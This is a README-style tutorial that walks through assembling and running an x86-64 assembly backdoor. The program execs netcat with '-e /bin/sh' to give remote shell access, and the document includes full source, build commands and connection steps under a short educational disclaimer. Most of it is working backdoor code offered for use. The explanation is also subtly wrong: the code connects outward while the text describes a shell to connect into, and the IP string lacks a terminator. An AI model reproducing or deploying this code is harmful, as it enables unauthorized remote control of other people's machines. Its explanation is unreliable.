# Backdoor Shell with Netcat - Assembly Project

This project demonstrates the creation of a backdoor shell using `netcat` and x86-64 assembly. The backdoor will open a shell on the target machine that allows remote access through `netcat`.

## Table of Contents

- [Introduction](#introduction)
- [Prerequisites](#prerequisites)
- [Setup and Compilation](#setup-and-compilation)
- [Code Explanation](#code-explanation)
- [Execution](#execution)
- [Disclaimer](#disclaimer)

## Introduction

A backdoor is a method of bypassing normal authentication procedures to gain unauthorized access to a system. In this tutorial, we'll create a backdoor using `netcat` and assembly language. This backdoor will open a shell that can be accessed remotely.

## Prerequisites

To follow along with this tutorial, you'll need:

- Basic knowledge of assembly language
- Familiarity with Linux and terminal commands
- `nasm` assembler and `ld` linker installed on your system
- `netcat` installed on your system

## Setup and Compilation

### Step 1: Install Necessary Tools

If you haven't installed `nasm`, `ld`, and `netcat`, you can do so using the following commands:

```bash
sudo apt-get update
sudo apt-get install nasm
sudo apt-get install binutils
sudo apt-get install netcat
```

### Step 2: Write the Assembly Code
Create a file named backdoor.asm and add the following code to it:

```assembly
section .text
    global _start

_start:
    ; Zero out RDX
    xor     rdx, rdx

    ; Setting up the command for netcat ("/bin/nc")
    mov     rdi, 0x636e2f6e69622fff    ; "/bin/nc" in hexadecimal
    shr     rdi, 8                     ; Shift right by 8 bits to remove the last byte
    push    rdi                        ; Push the command string onto the stack
    mov     rdi, rsp                   ; Move the stack pointer into RDI

    ; Setting up the command to execute ("/bin/sh")
    mov     rcx, 0x68732f6e69622fff    ; "/bin/sh" in hexadecimal
    shr     rcx, 8                     ; Shift right by 8 bits to remove the last byte
    push    rcx                        ; Push the command string onto the stack
    mov     rcx, rsp                   ; Move the stack pointer into RCX

    ; Setting up the argument for netcat ("-e")
    mov     rbx, 0x652dffffffffffff    ; "-e" in hexadecimal
    shr     rbx, 0x30                  ; Shift right by 48 bits to remove the last byte
    push    rbx                        ; Push the argument onto the stack
    mov     rbx, rsp                   ; Move the stack pointer into RBX

    ; Setting up the port number ("1337")
    mov     r10, 0x37333331ffffffff    ; "1337" in hexadecimal
    shr     r10, 0x20                  ; Shift right by 32 bits to remove the last 2 bytes
    push    r10                        ; Push the port number onto the stack
    mov     r10, rsp                   ; Move the stack pointer into R10

    ; Call the function to organize arguments
    jmp     short ip

continuar:
    pop     r9                         ; Pop the IP address into R9
    push    rdx                        ; Push NULL onto the stack
    push    rcx                        ; Push the address of "/bin/sh"
    push    rbx                        ; Push the address of the argument "-e"
    push    r10                        ; Push the address of the port number
    push    r9                         ; Push the address of the IP
    push    rdi                        ; Push the address of "/bin/nc"

    ; Set up execve syscall
    mov     rsi, rsp                   ; Move the stack pointer into RSI
    mov     al, 59                     ; Set syscall number 59 for execve
    syscall                            ; Invoke the syscall

ip:
    call    continuar                  ; Call the function to organize arguments
    db "127.0.0.1"                     ; IP address in string format
```

### Step 3: Assemble and Link
Use nasm to assemble the code and ld to link it:

```bash
nasm -f elf64 -o backdoor.o backdoor.asm
ld -o backdoor backdoor.o
```
This will produce an executable named backdoor.

## Code Explanation
The assembly code sets up and executes the netcat command to open a remote shell. Here's a step-by-step breakdown of the code:

1. Zero out RDX: This initializes rdx to zero.
2. Setting up the command for netcat: The string "/bin/nc" is loaded into rdi and pushed onto the stack.
3. Setting up the command to execute: The string "/bin/sh" is loaded into rcx and pushed onto the stack.
4. Setting up the argument for netcat: The string "-e" is loaded into rbx and pushed onto the stack.
5. Setting up the port number: The string "1337" is loaded into r10 and pushed onto the stack.
6. Organize arguments: The jmp and call instructions are used to push the IP address and other arguments onto the stack in the correct order.
7. Set up execve syscall: The execve syscall is set up and executed, which runs netcat with the specified arguments.

## Execution
To execute the backdoor, run the following command:

```bash
./backdoor
```
This will open a shell that can be accessed remotely. To connect to the shell, use the following netcat command from another machine:

```bash
nc 127.0.0.1 1337
```
Replace 127.0.0.1 with the IP address of the target machine if you are connecting from a different machine.

# Disclaimer
This project is for educational purposes only. Unauthorized use of this code to gain access to computer systems without permission is illegal and unethical. Always obtain proper authorization before conducting any security testing or using backdoor techniques.

**By following this tutorial, you agree to use the information responsibly and ethically.**